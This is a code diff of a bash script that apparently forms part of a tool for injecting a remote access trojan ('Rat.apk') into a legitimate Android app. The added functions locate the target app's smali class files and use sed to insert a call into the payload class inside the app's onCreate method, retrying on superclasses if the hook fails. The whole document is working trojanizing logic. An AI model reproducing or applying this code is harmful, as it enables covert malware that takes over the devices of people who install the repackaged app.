@@ -34,8 +34,71 @@ ORIG_APK_FILE=$1
 RAT_APK_FILE=Rat.apk
 LOG_FILE=$MY_PATH/run.log
 TIME_OF_RUN=`date`
+# for functions
+FUNC_RESULT=""
 
 # functions
+function find_smali_file {
+  # $1 = smali_file_to_hook
+  # $2 = android_class
+  if [ ! -f $1 ]; then
+    local index=2
+    local max=1000
+    local smali_file=""
+    while [ $index -lt $max ]; do
+      smali_file=$MY_PATH/original/smali_classes$index/$2.smali
+      if [ -f $smali_file ]; then
+        # found
+        FUNC_RESULT=$smali_file
+        return 0
+      else
+        let index=index+1
+      fi
+    done
+    # not found
+    return 1
+  else
+    FUNC_RESULT=$1
+    return 0
+  fi
+}
+
+function hook_smali_file {
+  # $1 = payload_tld
+  # $2 = payload_primary_dir
+  # $3 = payload_sub_dir
+  # $4 = smali_file_to_hook
+  local stop_hooking=0
+  local smali_file=$4
+  while [ $stop_hooking -eq 0 ]; do
+    sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$1"'\/'"$2"'\/'"$3"'\/a;->a(Landroid\/content\/Context;)V' $smali_file >>$LOG_FILE 2>&1
+    grep -B 2 "$1/$2/$3/a" $smali_file >>$LOG_FILE 2>&1
+    if [ $? == 0 ]; then
+      echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
+      FUNC_RESULT=$smali_file
+      return 0
+    else
+      echo "Failed to hook smali file" >>$LOG_FILE 2>&1
+      local super_android_class=`grep ".super" $smali_file |sed 's/.super L//g' |sed 's/;//g'`
+      if [ -z $super_android_class ]; then
+        let stop_hooking=stop_hooking+1
+      else
+        echo "Trying to hook super class: $super_android_class" >>$LOG_FILE 2>&1
+        smali_file=$MY_PATH/original/smali/$super_android_class.smali
+        echo "New smali file to hook: $smali_file" >>$LOG_FILE 2>&1
+        find_smali_file $smali_file $super_android_class
+        if [ $? != 0 ]; then
+          echo "Failed to find new smali file" >>$LOG_FILE 2>&1
+          let stop_hooking=stop_hooking+1
+        else
+          echo "Found new smali file" >>$LOG_FILE 2>&1
+        fi
+      fi
+    fi
+  done
+  return 1
+}
+
 function cleanup {
   echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
   bash cleanup.sh >>$LOG_FILE 2>&1
@@ -440,31 +503,24 @@ echo "Value of tmp: $tmp" >>$LOG_FILE 2>&1
 if [[ $tmp == /* ]]; then
   tmp=$total_package$tmp
 fi
-smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
-if [ ! -f $smali_file_to_hook ]; then
-  found=0
-  index=2
-  max=1000
-  while [ $found -eq 0 ]; do
-    smali_file_to_hook="$MY_PATH/original/smali_classes$index/$tmp.smali"
-    if [[ -f $smali_file_to_hook || $index -eq $max ]]; then
-      let found=found+1
-    else
-      let index=index+1
-    fi
-  done
-fi
-echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
-echo "done."
-if [ ! -f $smali_file_to_hook ]; then
+android_class=$tmp
+echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
+smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
+find_smali_file $smali_file_to_hook $android_class
+rc=$?
+if [ $rc != 0 ]; then
+  echo "done."
   echo "[!] Failed to locate smali file to hook"
   cleanup
-  exit 1
+  exit $rc
+else
+  echo "done."
+  smali_file_to_hook=$FUNC_RESULT
+  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
 fi
 
 echo -n "[*] Adding hook in original smali file..."
-sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, L'"$payload_tld"'\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/a;->a(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
-grep -B 2 "$payload_tld/$payload_primary_dir/$payload_sub_dir/a" $smali_file_to_hook >>$LOG_FILE 2>&1
+hook_smali_file $payload_tld $payload_primary_dir $payload_sub_dir $smali_file_to_hook
 rc=$?
 echo "done."
 if [ $rc != 0 ]; then
